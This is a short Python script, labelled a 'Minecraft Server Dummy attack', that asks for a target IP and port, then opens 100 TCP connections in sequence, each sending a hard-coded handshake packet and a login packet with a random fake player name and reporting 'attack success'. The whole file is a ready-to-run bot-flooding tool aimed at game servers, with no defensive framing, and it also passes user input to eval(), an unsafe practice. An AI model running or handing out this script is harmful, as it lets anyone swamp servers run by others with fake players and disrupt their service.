# -*- coding: utf-8 -*-
# Minecraft Server Dummy attack
import socket
import time
import string
import random


target_host = input("ip: ")
target_port = eval(input("port: "))

def attack(player_name):
    ''' 假人攻击 '''
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tcp_client:
        tcp_client.connect((target_host, target_port))

        # 发送 TCP 数据包
        tcp_client.send(b"\x16\x00\xf2\x05\x0fe3.centurymc.cnNa\x02")
        tcp_client.send(b"\x08\x00\x06" + bytes(player_name, "utf-8"))
        time.sleep(1)

        response = tcp_client.recv(4096)
        if "handshake" in str(response):
            print(f"[*] {player_name} attack success.")
        tcp_client.close()
        time.sleep(3)


def main():
    ''' 主函数 '''
    for i in range(100):
        player_name = ''.join(random.sample(string.ascii_lowercase + string.digits, 6))
        attack(player_name)


if __name__ == '__main__':
    main()


